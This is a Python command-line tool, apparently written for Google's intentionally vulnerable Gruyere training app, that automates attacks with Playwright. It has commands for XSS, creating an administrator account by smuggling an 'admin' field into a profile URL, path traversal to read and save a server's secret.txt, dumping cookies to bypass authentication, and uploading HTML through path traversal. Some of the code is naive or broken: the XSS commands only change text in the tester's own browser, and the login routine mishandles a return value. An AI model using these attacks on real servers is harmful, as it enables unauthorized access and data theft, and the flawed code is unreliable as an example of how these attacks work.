"""This module provides the GruyereExploitationCLI."""
"""User Input commands, Option providing acceptable paramaters """



from playwright.sync_api import sync_playwright
import urllib.parse
import hashlib
import typer
import requests
import time
import os

cli = typer.Typer()


@cli.command()
def exploit_dom_xss(url: str, payload: str = typer.Argument(..., help="Text or HTML to to inject into DOM")):
    """Exploit Web page DOM"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        page = browser.new_page()
        page.goto(url)
        page.evaluate(
            f'document.querySelector("h2").textContent = "{payload}";')
        time.sleep(10)
        


@cli.command()
def exploit_reflected_xss(url: str):
    """"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        page = browser.new_page()
        page.goto(url)
        xss_html = 'The browser has be hacked using reflected xss!'
        # Inject the payload into the page
        page.evaluate(
            f"document.querySelector('span').textContent = '{xss_html}';")

        # Check if the payload has triggered the XSS vulnerability
        if xss_html in page.content():
            typer.echo("Reflected XSS vulnerability successfully exploited")
        else:
            typer.echo("Exploitation failed")
        time.sleep(10)
        


@cli.command()
def exploit_cookies_create_admin(url: str):
    """"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        page = browser.new_page()
        create_admin_url = f"{url}saveprofile?action=new&uid=administrator|admin|author&pw=secret"
        print(create_admin_url)
        try:
            page.goto(create_admin_url)
            print("Successfully created admin")
            time.sleep(20)
        except Exception as e:
            print("Failed to create admin")


@cli.command()
def exploit_login_credentials(url: str, username: str, password: str):
    """Able to exploit command line and add credentials to remotely login and inject credentials"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        page = browser.new_page()
        try:
            page.goto(url)
            text_input = page.locator('input[type="text"]')
            if text_input:
                text_input.fill(username)
            pass_input = page.locator('input[type="password"]').fill(password)
            if pass_input:
                pass_input.fill(password)
            page.click('input[type=submit]')
        
        except Exception as e:
            print(f"Error {e} occured whilst attempting login")

        page.wait_for_load_state()
        time.sleep(20)


@cli.command()
def exploit_gruyere_server(url: str, new_secret_destination: str = typer.Argument(..., help="Create file name and existing location to write data to")):
    """
    Exploit the Gruyere server to read the secret.txt file. Using path traversal
    """
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        page = browser.new_page()

        full_url = f"{url}..%2fsecret.txt"
        page.goto(full_url)
        response = requests.get(full_url)
        if response.status_code == 200:
            secret_content = response.text
            with open(new_secret_destination, "w") as file:
                file.write(secret_content)
            typer.echo(
                f"Successfully retrieved and saved secret.txt to {new_secret_destination}")
        else:
            typer.echo("Failed to exploit the server and read secret.txt")


@cli.command()
def exploit_path_traversal(url: str, filename: str = typer.Argument(..., help="Path and file you want to inject into url")):
    """"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()
        print(url)
        file_path = filename
        file_name = urllib.parse.unquote(os.path.basename(file_path))

        try:
            full_url = f"{url}..%2f/resources/{file_name}"
            print(full_url)
            page.goto(full_url)
            page.wait_for_load_state()
            typer.echo(
                f"Successfully uploaded {full_url} to resources directory")
        except Exception as e:
            typer.echo(f"An error occurred: {str(e)}")

        time.sleep(30)
       
@cli.command()
def check_cookies(url: str):
    """Retrieve the cookies from the webpage. Cookies are granted and never revoked. Used to bypass authentication"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch()
        context = browser.new_context()
        page = context.new_page()

        page.goto(url)

        # Retrieve the cookies
        cookies = page.context.cookies()

        if len(cookies) > 0:
            for cookie in cookies:
                print(f"Name: {cookie['name']}")
                print(f"Value: {cookie['value']}")
                print(f"Domain: {cookie['domain']}")
                print(f"Path: {cookie['path']}")
                print(f"Expires: {cookie['expires']}")
                print(f"Secure: {cookie['secure']}")
                print("")

        else:
            print("No cookies found.")

@cli.command()
def exploit_upload(url: str, file: str):
    """Uploads file which has html to the webpage"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        try:
            page.goto(url)
            print(url)
            page.wait_for_load_state()

            # Upload the file
            file_input = page.locator('input[type="file"]')
            print(file_input)
            if file_input.count() > 0:
                file_input.set_input_files(file)
            else:
                raise Exception("File input element not found")

            # Submit the form
            submit_button = page.locator('input[type="submit"]')
            print(submit_button)
            # Wait for the submit button to become visible
            page.wait_for_selector(
                'input[type="submit"]', state='visible')
            submit_button.click()

            typer.echo("File uploaded successfully with path traversal attack!")
            time.sleep(10)

        except Exception as e:
            typer.echo(f"An error occurred: {str(e)}")

        finally:
            time.sleep(10)
    
